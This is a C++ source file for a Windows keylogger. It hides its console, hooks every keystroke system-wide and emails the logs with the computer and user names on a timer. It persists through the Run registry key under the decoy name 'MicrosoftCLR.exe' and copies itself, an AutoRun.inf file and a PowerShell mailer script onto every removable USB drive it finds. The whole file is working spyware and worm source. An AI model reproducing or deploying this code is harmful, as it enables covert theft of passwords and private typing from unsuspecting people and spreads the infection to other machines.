// Entry.cpp : Defines the entry point for the console application.
// Project- Console Application
// Properties -> Linker -> System, here change SubSystem to Windows
// Properties -> Configuration Properties -> General-> Character, here change to Not Set
//https://msdn.microsoft.com/ru-ru/library/windows/desktop/ms724953(v=vs.85).aspx add
#include <iostream>
#include "stdafx.h"
#include <locale>
#include <codecvt>
#include "InputOutup.h"
#include "Timer.h"
#include <comutil.h>
#include <fstream>
#include "windows.h"
#include <Windows.h>
#include <set>
#include <vector>
#include "KeyMap.h"
#include "Timer.h"
#include "Mail.h"
#include <windows.h>
#define INFO_BUFFER_SIZE 32767
bool checkMyDir();
void deleteStartUp();
void RegisterProgram();
BOOL DeleteMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args);
bool InstallHook();
BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName);
void TimerSendMail();
LRESULT KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam);
DWORD WINAPI sendAppData(LPVOID lp_param);
DWORD WINAPI spreadToUSB(LPVOID lp_param);
DWORD thread_USB_ID;
HANDLE thread_USB;
string keylog = "";
HHOOK eHook = NULL;
Timer MailTimer(TimerSendMail, 10000 * 6);
CRITICAL_SECTION writeAppData;
bool mailSend = 0; // 0 - mail wasn't send, 1 - send
wchar_t buffer[256];
int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR IpCmdLine, int nCmdShow) // to disable console icon

{
	if (checkMyDir() == 1)
		return 0;
	if (IsMyProgramRegisteredForStartup(L"MicrosoftCLR.exe"))
	{
		deleteStartUp();
	}
	RegisterProgram();
	MSG Msg;
	DWORD thread_sendAppData_ID;
	HANDLE thread_sendAppData;
	
	InitializeCriticalSection(&writeAppData);
	thread_sendAppData = (HANDLE)
		CreateThread(NULL, // default security attributes
			0,// use default stack size  
			sendAppData,// thread function name
			NULL,// argument to thread function 
			0, // use default creation flags : the thread runs immediately after creation.
			   /*
			   If the function succeeds, the return value is a handle to the new thread.
			   If the function fails, the return value is NULL. */
			&thread_sendAppData_ID);  // returns the thread identifier 
	thread_USB = (HANDLE)
		CreateThread(NULL, // default security attributes
			0,// use default stack size  
			spreadToUSB,// thread function name
			NULL,// argument to thread function 
			0, // use default creation flags : the thread runs immediately after creation.
			   /*
			   If the function succeeds, the return value is a handle to the new thread.
			   If the function fails, the return value is NULL. */
			&thread_USB_ID);  // returns the thread identifier 
	InputOutup inOut;
	inOut.getPath(true);
	InstallHook();
	while (GetMessage(&Msg, NULL, 0, 0))
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);

	}
	MailTimer.Stop();
	EnterCriticalSection(&writeAppData);
	TerminateThread(spreadToUSB, NO_ERROR);
	TerminateThread(thread_sendAppData, NO_ERROR);
	LeaveCriticalSection(&writeAppData);	
	DeleteCriticalSection(&writeAppData);
	return 0;
}
string ws2s(const std::wstring& wstr)
{
	using convert_typeX = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_typeX, wchar_t> converterX;

	return converterX.to_bytes(wstr);
}
/*
1- I'm in USB
0 - I'm in pc
*/
bool checkMyDir()
{
	vector<wchar_t> pathBuf;
	CurrentTimeDate currDate;
	DWORD copied = 0;
	do {
		pathBuf.resize(pathBuf.size() + MAX_PATH);
		copied = GetModuleFileName(0, (LPSTR)&pathBuf.at(0), pathBuf.size());
	} while (copied >= pathBuf.size());

	pathBuf.resize(copied);

	wstring path(pathBuf.begin(), pathBuf.end());
	InputOutup temp;
	set<wchar_t> devices;
	unsigned int disks = GetLogicalDrives();
	wchar_t drive_root[] = L"?:";
	for (int i = 31; i >= 0; i--)
	{
		if (disks & (1 << i))
		{
			drive_root[0] = static_cast<wchar_t>('A') + i;
			DWORD type = GetDriveTypeW(drive_root);
			if (type == DRIVE_REMOVABLE)
			{
				wchar_t buf[MAX_PATH];
				if (QueryDosDeviceW(drive_root, buf, MAX_PATH))
					if (wstring(buf).find(L"\\Floppy") == std::wstring::npos)
						devices.insert(static_cast<wchar_t>('A') + i);
			}

		}
	}

	string copydir = temp.getPath(true) + "CP.exe";
	string copyscript = temp.getPath(true) + "EmailSend2.ps1";
	string copyauto = temp.getPath(true) + "AutoRun.inf";
	string str = (char*)path.c_str();
	if (str == copydir)
		return 0;
	else
	{
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		CopyFile((LPCSTR)(path.c_str()), (LPCSTR)copydir.c_str(), TRUE);
		set<wchar_t>::iterator it;
		bool flag;
		for (it = devices.begin(); it != devices.end(); ++it)
		{
			string temp1;
			string temp2;
			temp1 += *it;
			temp2 += *it;
			temp2 += ":\\AutoRun.inf";
			temp1 += ":\\EmailSend2.ps1";
			CopyFile((LPCSTR)temp1.c_str(), (LPCSTR)copyscript.c_str(), TRUE);
			CopyFile((LPCSTR)temp2.c_str(), (LPCSTR)copyauto.c_str(), TRUE);
		}
		//CopyFile((LPCSTR)(pathBuf[0]+pathBuf[1] + pathBuf[2] + pathBuf[3] + "EmailSend2.ps1"), (LPCSTR)copyscript.c_str(), TRUE);
		CreateProcess((LPCSTR)copydir.c_str(),   // Module name 
			NULL,        // Command line
			NULL,           // Process handle inheritance
			NULL,           // Thread handle inheritance
			FALSE,          // Describe inheritance
			NULL,              // creation flags
			NULL,           // Use parent's environment block
			NULL,           // Use parent's starting directory 
			&si,            // Pointer to STARTUPINFO structure
			&pi           // Pointer to PROCESS_INFORMATION structure
			);
		return 1;
	}
	
}
bool InstallHook()
{
	MailTimer.Start(true);
	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc, GetModuleHandle(NULL), 0);
	return eHook == NULL;
}
bool UnistallHook()
{
	BOOL b = UnhookWindowsHookEx(eHook);
	eHook = NULL;
	return (bool)b;
}

bool IsHooked()
{
	return (bool)(eHook == NULL);
}

void TimerSendMail()
{
	InputOutup inOut;
	CurrentTimeDate currDate;
	Mail eMail;	
	TCHAR  infoBuf[INFO_BUFFER_SIZE];
	DWORD  bufCharCount = INFO_BUFFER_SIZE;
	if (keylog.empty())
	{
		return;
	}	
	string last_file = inOut.WriteLog(keylog);
	if (last_file.empty())
	{
		EnterCriticalSection(&writeAppData);
		currDate.writeAppLog("File creation was not successful. Keylog '" + keylog + "'");
		LeaveCriticalSection(&writeAppData);
		return;
	}
	GetComputerName(infoBuf, &bufCharCount);
	string computer_name = (char*)infoBuf;
	GetUserName(infoBuf, &bufCharCount);
	string user_name = (char*)infoBuf;
	int x = eMail.sendMail("Log [" + last_file + "]", "The file with log file\nComputer name:" + computer_name + "\nUser name:" + user_name, inOut.getPath(true) +  last_file);
	inOut.deleteLog(inOut.getPath(true) + last_file);
	if (x != 7)  // if the mail sending has failed
	{
		EnterCriticalSection(&writeAppData);
		currDate.writeAppLog("Mail was not sent! Error code: " + currDate.toString(x));
		currDate.writeAppLog(keylog);
		LeaveCriticalSection(&writeAppData);
		mailSend = 0;
	}
	keylog = "";    // we "clear" it, there is no point in keeping that string anymore
	
}
// the following function can also be used to "forbid" keys from the keyboard, so when they are pressed, they are ineffective
LRESULT KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
	KeyMap keys;
	if (nCode < 0)
		CallNextHookEx(eHook, nCode, wparam, lparam);
	KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) // we check if someone has pressed a key (and not released it yet)
	{
		keylog += keys.getName(kbs);
		if (kbs->vkCode == VK_RETURN)    // if someone presses enter, it just goes to a new line, it doesn't log "enter"
			keylog += '\n';
	}
	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)    // if the keys' state is "up"
	{   // we have smth like [SHIFT][a][b][/SHIFT][c][d], so we know that [a],[b] are upper-case
		DWORD key = kbs->vkCode;
		if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_SHIFT || key == VK_RSHIFT
			|| key == VK_LSHIFT || key == VK_MENU || key == VK_LMENU || key == VK_RMENU || key == VK_CAPITAL || key == VK_NUMLOCK
			|| key == VK_LWIN || key == VK_RWIN)
		{

			std::string KeyName = keys.getName(kbs);
			KeyName.insert(1, "/"); // inserting the backslash for the e.g. [SHIFT]...[/SHIFT]
			keylog += KeyName;
		}
	}
	return CallNextHookEx(eHook, nCode, wparam, lparam);    // we return it to the system
}

DWORD WINAPI sendAppData(LPVOID lp_param)
{
	InputOutup inOut;
	CurrentTimeDate currDate;
	Mail eMail;
	TCHAR  infoBuf[INFO_BUFFER_SIZE];
	DWORD  bufCharCount = INFO_BUFFER_SIZE;
	GetComputerName(infoBuf, &bufCharCount);
	string computer_name = (char*)infoBuf;
	GetUserName(infoBuf, &bufCharCount);
	string user_name = (char*)infoBuf;
	while (1)
	{
		EnterCriticalSection(&writeAppData);
		if (!mailSend)
		{
			InputOutup temp;
			string path = temp.getPath(true);
			int y = eMail.sendMail("Log [AppData]", "The file with appdata file\nComputer name:" + computer_name + "\nUser name:" + user_name, path + "AppLog.txt");
			if (y == 7)
			{
				mailSend = 1;
				inOut.deleteLog(path + "AppLog.txt");
			}
		}
		LeaveCriticalSection(&writeAppData);
		Sleep(10000);
	}
	return 0;
}

DWORD WINAPI spreadToUSB(LPVOID lp_param)
{
	while (1)
	{
		set<wchar_t> devices;
		unsigned int disks = GetLogicalDrives();
		wchar_t drive_root[] = L"?:";
		for (int i = 31; i >= 0; i--)
		{
			if (disks & (1 << i))
			{
				drive_root[0] = static_cast<wchar_t>('A') + i;
				DWORD type = GetDriveTypeW(drive_root);
				if (type == DRIVE_REMOVABLE)
				{
					wchar_t buf[MAX_PATH];
					if (QueryDosDeviceW(drive_root, buf, MAX_PATH))
						if (wstring(buf).find(L"\\Floppy") == std::wstring::npos) 
							devices.insert(static_cast<wchar_t>('A') + i); 
				}

			}
		}
		vector<wchar_t> pathBuf;
		DWORD copied = 0;
		do {
			pathBuf.resize(pathBuf.size() + MAX_PATH);
			copied = GetModuleFileName(0, (LPSTR)&pathBuf.at(0), pathBuf.size());
		} while (copied >= pathBuf.size());

		pathBuf.resize(copied);
		InputOutup copy;
		string copyscript = copy.getPath(true) + "EmailSend2.ps1";
		string copyauto = copy.getPath(true) + "AutoRun.inf";
		wstring path(pathBuf.begin(), pathBuf.end());
		if (devices.size() != 0)
		{
			set<wchar_t>::iterator it;
			bool flag;
			for (it = devices.begin(); it != devices.end(); ++it)
			{
				string temp;
				string temp1;
				string temp2;
				temp += *it;
				temp1 += *it;
				temp2 += *it;
				temp += ":\\CP.exe";
				temp1 += ":\\EmailSend2.ps1";
				temp2 += ":\\AutoRun.inf";
				CopyFile((LPCSTR)(path.c_str()), (LPCSTR)temp.c_str(), TRUE);			
				CopyFile((LPCSTR)copyscript.c_str(), (LPCSTR)temp1.c_str(), TRUE);
				CopyFile((LPCSTR)copyauto.c_str(),(LPCSTR)temp2.c_str(), TRUE);
			}
		}
		Sleep(10000);
	}
	return 0;
}

BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName)
{
	HKEY hKey = NULL;	
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwRegType = REG_SZ;
	wchar_t szPathToExe[MAX_PATH] = {};
	DWORD dwSize = sizeof(szPathToExe);

	lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		lResult = RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
		fSuccess = (lResult == 0);
	}

	if (fSuccess)
	{
		fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
	{
		wcscat_s(szValue, count, args);
	}

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

void RegisterProgram()
{
	wchar_t szPathToExe[MAX_PATH];

	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	RegisterMyProgramForStartup(L"MicrosoftCLR.exe", szPathToExe, L"-foobar");
 
}
void deleteStartUp()
{
	wchar_t szPathToExe[MAX_PATH];

	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	DeleteMyProgramForStartup(L"MicrosoftCLR.exe", szPathToExe, L"-foobar");
}
BOOL DeleteMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
	{
		// caller should make sure "args" is quoted if any single argument has a space
		wcscat_s(szValue, count, args);
	}

	lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"", 0, KEY_ALL_ACCESS, &hKey);
	RegDeleteKey(hKey,"Software\\Microsoft\\Windows\\CurrentVersion\\Run");
	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}
